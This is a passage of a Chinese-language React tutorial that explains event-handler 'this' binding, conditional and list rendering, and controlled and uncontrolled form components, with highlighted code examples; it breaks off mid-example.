language_">this</span>.<span class="property">changeText</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)&#125;&gt;改变文本&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><br />我们希望绑定事件函数中的 this 指向这个组件对象，这里有三种解决方案：</p><p><a name="oyhDO"></a></p><h4 id="（1）显示绑定"><a href="#（1）显示绑定" class="headerlink" title="（1）显示绑定"></a>（1）显示绑定</h4><p>就像上面所说的，使用 bind 方法将这个函数的 this 绑定到当前组件对象的 this 上</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onClick=&#123;<span class="variable language_">this</span>.<span class="property">btnClick</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)&#125;&gt;按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>也可以在构造方法中，将该方法进行重新赋值</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123; &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">btnClick</span> = <span class="variable language_">this</span>.<span class="property">btnClick</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这种方法固然是可以实现，但是可能会产生很多重复的代码。</p><p><a name="Xu10m"></a></p><h4 id="（2）使用箭头函数定义函数"><a href="#（2）使用箭头函数定义函数" class="headerlink" title="（2）使用箭头函数定义函数"></a>（2）使用箭头函数定义函数</h4><p>因为箭头函数永远不绑定 this，它里面的 this 会读取上一层作用域的属性，如果没有找到就逐层向上查找。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btnClick = <span class="function">() =&gt;</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p><a name="ZYNHj"></a></p><h4 id="（3）传入一个箭头函数，在箭头函数中调用需要执行的函数（推荐使用）"><a href="#（3）传入一个箭头函数，在箭头函数中调用需要执行的函数（推荐使用）" class="headerlink" title="（3）传入一个箭头函数，在箭头函数中调用需要执行的函数（推荐使用）"></a>（3）传入一个箭头函数，在箭头函数中调用需要执行的函数（推荐使用）</h4><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;button</span><br><span class="line">  onClick=&#123;<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">btnClick</span>();</span><br><span class="line">  &#125;&#125;</span><br><span class="line">&gt;</span><br><span class="line">  按钮</span><br><span class="line">&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>它的原理就是，当我们点击按钮时，就会执行箭头函数中的函数体，也就是执行事件绑定的方法。当执行这个方法的时候，由于箭头函数是不绑定 this 的，所以它会向上层作用域的<code>render</code>中进行查找，这样就会将<code>this</code>隐式绑定在事件函数上面。</p><p>在执行事件函数时，有可能我们需要获取一些参数信息：比如<code>event</code>对象、其他参数 <br />（1）情况一：获取<code>event</code>对象<br />● 很多时候我们需要拿到<code>event</code>对象来做一些事情（比如阻止默认行为）<br />● 假如我们用不到<code>this</code>，那么直接传入函数就可以获取到 event 对象；<br />（2）情况二：获取更多参数 <br /> ● 有更多参数时，我们最好的方式就是传入一个箭头函数，主动执行的事件函数，并且传入相关的其他参数；<br><a name="NA0FE"></a></p><h3 id="9-React-条件渲染"><a href="#9-React-条件渲染" class="headerlink" title="9. React 条件渲染"></a>9. React 条件渲染</h3><p>某些情况下，界面的内容会根据不同的情况显示不同的内容，或者决定是否渲染某部分内容：<br />● 在 vue 中，我们会通过指令来控制：比如<code>v-if</code>、<code>v-show</code>； <br />● 在 React 中，所有的条件判断都和<code>普通的JavaScript</code>代码一致；</p><p>常见的条件渲染的方式有以下三种：<br />● 方式一：<code>条件判断语句</code>，适合逻辑较多的情况<br />● 方式二：<code>三元运算符</code>，适合逻辑比较简单<br />● 方式三：<code>与运算符&amp;&amp;</code>，如果条件成立，渲染&amp;&amp;后面的组件；如果条件不成立，什么内容也不渲染；</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; isLogin &#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.方案一:通过if判断: 逻辑代码非常多的情况</span></span><br><span class="line">        <span class="keyword">let</span> welcome = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> btnText = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (isLogin) &#123;</span><br><span class="line">          welcome = <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎回来~<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">          btnText = <span class="string">&quot;退出&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          welcome = <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>请先登录~<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">          btnText = <span class="string">&quot;登录&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            &#123;welcome&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;/* 2.方案二: 三元运算符 */&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;e</span> =&gt;</span> this.loginClick()&#125;&gt;&#123;isLogin ? &quot;退出&quot; : &quot;登录&quot;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;isLogin ? &quot;你好, React&quot;: null&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            &#123;/* 3.方案三: 逻辑与&amp;&amp; */&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;/* 逻辑与: 一个条件不成立, 后面的条件都不会进行判断了 */&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123; isLogin &amp;&amp; &quot;你好, React&quot; &#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123; isLogin &amp;&amp; <span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好, React<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> &#125;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><br />在 Vue 中，<code>v-if</code>是对元素隐藏时，会将元素送 DOM 树上删除掉；而<code>v-show</code>只是对元素进行隐藏，其原理就是给元素添加<code>display:none</code>，它更适用于频繁切换某个元素的显示&#x2F;隐藏的情况，会大大的节省开销。</p><p>那在上面我们对 React 元素的显示和隐藏都相当于 Vue 中<code>v-if</code>，元素在隐藏之后就不会出现在 DOM 树上，我们可以用 React 来实现一下 Vue 中 v-show 指令的效果：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">isLogin</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; isLogin &#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line">    <span class="keyword">const</span> titleDisplayValue = isLogin ? <span class="string">&quot;block&quot;</span> : <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;(e)</span> =&gt;</span> this.loginClick()&#125;&gt;</span></span><br><span class="line"><span class="language-xml">          &#123;isLogin ? &quot;退出&quot; : &quot;登录&quot;&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">display:</span> <span class="attr">titleDisplayValue</span> &#125;&#125;&gt;</span>你好, React<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">loginClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">isLogin</span>: !<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">isLogin</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样，元素隐藏之后还是会在 DOM 树上，只是不会显示在页面上，节省了开销，提高了页面的性能。<br><a name="vSUct"></a></p><h3 id="10-React-列表渲染"><a href="#10-React-列表渲染" class="headerlink" title="10. React 列表渲染"></a>10. React 列表渲染</h3><p>在实际的开发过程中，我们通常会将请求的大量数据渲染成列表，在 Vue 中，我们可以使用<code>v-for</code>进行列表的渲染，而在 React 中需要我们通过 JavaScript 代码的方式组织数据，转成 JSX。</p><p>在 React 中，展示列表最多的方式就是使用数组的 map 方法，使用它来遍历数组元素，也可以在遍历的过程中对数组元素进行操作；除此之外，为我们还会用到 filter 方法过滤数据，使用 slice 方法截取数据等等。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  &#123;<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">numbers</span></span><br><span class="line">    .<span class="title function_">filter</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &gt;= <span class="number">50</span>)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    ))&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p><br />需要注意的是，在渲染是，我们需要给渲染项添加一个 key，不然会报错：<code>warning:Each child in a list should have a unique “key” prop.</code><br />在 React 中，key 属性是给 React 自己用的一个特殊属性，就是说即使为一个组件设置 key 之后，我们也无法获取这个组件的 key 值。它是一种身份标识，每个 key 对应一个组件。key 的值必须保证唯一且稳定，它类似于数据库中的主键 id 一样，有且唯一。 key 和 React 中的 diff 算法密切相关。</p><p><a name="NOirU"></a></p><h3 id="11-React-表单处理"><a href="#11-React-表单处理" class="headerlink" title="11. React 表单处理"></a>11. React 表单处理</h3><p>React 的组件分为<strong>受控组件</strong>和<strong>非受控组件：</strong></p><p>● <strong>受控组件</strong>：由 React 来管理表单元素的值，同时表单元素的变化需要实时映射到 React 的 state 中，这个类似于双向数据绑定。不同的表单元素，React 控制方式是不一样的，如 input 用 value 来控制，checkbox 用 checked 来判断是否选中等。<br />● <strong>非受控组件：</strong>非受控组件，表单数据将交由 DOM 节点来处理。React 提供了一个 ref 属性，用来从 DOM 节点中获取表单数据。</p><p><strong>受控组件：</strong><br />常见的受控组件有文本框、单选框、复选框、下拉列表等。<br /><strong>（1）文本框</strong><br />文本框包含类型为 <code>text</code> 、 <code>number</code> 的 <code>input</code> 元素和 <code>textarea</code> 元素。这些被受控的主要原理是通过元素的 <code>value</code> 属性设置表单元素的值，通过表单元素的 <code>onChange</code> 事件监听值的变化，并同步到 React 组件的 state 中。</p><p>当用户输入框内容改变的时候， <code>onChange</code> 事件会被触发，进而相应的处理函数会把值的变化通过 setState 同步到组件的 state 中，同时由于 state 值的变化，又会重新渲染表单，进而实现对表单元素状态的控制。 <br /><strong>（2）单选框</strong><br />在 HTML 中， <code>&lt;input type=&quot;radio&quot;&gt;</code> 标签可以创建单选框，由标签上的 <code>checked</code> 属性决定是否选中，在 React 中也是一样。<br /><strong>（3）复选框</strong><br />在 HTML 中， <code>&lt;input type=&quot;checkbox&quot;&gt;</code> 标签可以创建复选框，由标签上的 <code>checked</code>属性决定是否选中，在 React 中也是一样。<br /><strong>（4）下拉列表</strong><br />在 HTML 中， <code>&lt;select&gt;</code> 标签可以创建下拉列表，选中项由 <code>&lt;option&gt;</code> 上的 <code>selected</code> 属性决定。需要注意的是 React 并不会使用 selected 属性，而是在根 <code>&lt;select&gt;</code> 标签上使用 <code>value</code> 属性。</p><p>注意：select 标签可以使用多选，只需在标签中加一个 <code>multiple = &#123;true&#125;</code> ，同时 React 状态变量使用数组，当然 <code>onChange</code> 处理函数也需按数组处理。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Register</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleSubmit</span> = <span class="variable language_">this</span>.<span class="property">handleSubmit</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">phone</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">username</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">password</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  handleChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      [e.<span class="property">target</span>.<span class="property">name</span>]: e.<span class="property">target</span>.<span class="property">value</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleSubmit</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; phone, username, password &#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`手机号：<span class="subst">$&#123;phone&#125;</span> 昵称：<span class="subst">$&#123;username&#125;</span> 密码：<span class="subst">$&#123;password&#125;</span>`</span>);</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; phone, username, password &#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&quot;input-tip&quot;</span>&gt;</span>手机号：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">value</span>=<span class="string">&#123;phone&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&quot;input-tip&quot;</span>&gt;</span>昵 称：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">value</span>=<span class="string">&#123;username&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">name</span>=<span class="string">&quot;username&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&quot;input-tip&quot;</span>&gt;</span>密 码：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">value</span>=<span class="string">&#123;password&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">name</span>=<span class="string">&quot;password&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Register</span>;</span><br></pre></td></tr></table></figure><p><br /><strong>非受控组件：</strong><br />受控组件保证了表单元素的状态统一由 React 管理，但同时每个表单元素都需要通过 <code>onChange</code> 事件来绑定处理函数，然后将更改同步到 React 组件的 <code>state</code> 中，这个过程还是比较繁琐的。一种可替代方案是使用非受控组件，这时表单数据将交由 DOM 节点来处理。React 提供了一个 <code>ref</code> 属性，用来从 DOM 节点中获取表单数据。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Login</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleSubmit</span> = <span class="variable language_">this</span>.<span class="property">handleSubmit</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleSubmit</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(</span><br><span class="line">      <span class="string">`昵称：<span class="subst">$&#123;<span class="variable language_">this</span>.refs.username.value&#125;</span> 密码：<span class="subst">$&#123;<span class="variable language_">this</span>.refs.password.value&#125;</span>`</span></span><br><span class="line">    );</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">onSubmit</span>=<span class="string">&#123;this.handleSubmit&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;styles.row&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;styles.row&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;styles.row&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Login</span>;</span><br></pre></td></tr></table></figure><p><br />在填写完表单之后，我们通常会对表单进行校验，以确保表单数据格式准确。最常见的两种检验就是<strong>失去焦点校验</strong>和<strong>提交时校验</strong>。</p><p><strong>（1）失去焦点校验</strong><br />在失去焦点时加上校验规则，那么就需要监听 onBlur 事件，然后在 onBlur 事件中做验证规则处理。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 失去焦点校验</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Register</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  validator = 